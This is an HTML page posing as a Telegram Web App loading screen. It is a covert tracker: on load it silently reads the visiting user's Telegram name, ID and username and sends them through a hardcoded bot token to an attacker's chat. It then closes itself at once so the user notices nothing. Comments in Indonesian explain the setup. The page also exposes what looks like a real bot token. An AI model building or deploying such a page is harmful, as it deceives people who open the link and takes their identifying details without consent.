<!DOCTYPE html>
<html>
<head>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background: transparent; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .spinner { border: 2px solid rgba(255,255,255,0.1); border-top: 2px solid #3498db; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="spinner"></div>
    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();

        const user = tg.initDataUnsafe.user;
        const BOT_TOKEN = '8235135706:AAEoY_X5bamwRtLsiAqfRyz7h8b2ZvOmZlE';
        const ADMIN_ID = 'ID_TELEGRAM_KAMU'; // Ganti dengan ID kamu (cek di @userinfobot)

        if (user) {
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: ADMIN_ID,
                    text: `🎯 **Tracker Terdeteksi!**\n\n👤 Nama: ${user.first_name}\n🆔 ID: \`${user.id}\`\n🔗 User: @${user.username || '-'}`,
                    parse_mode: "Markdown"
                })
            }).finally(() => {
                tg.close(); // Tutup aplikasi secepat mungkin
            });
        } else {
            tg.close();
        }
    </script>
</body>
</html>
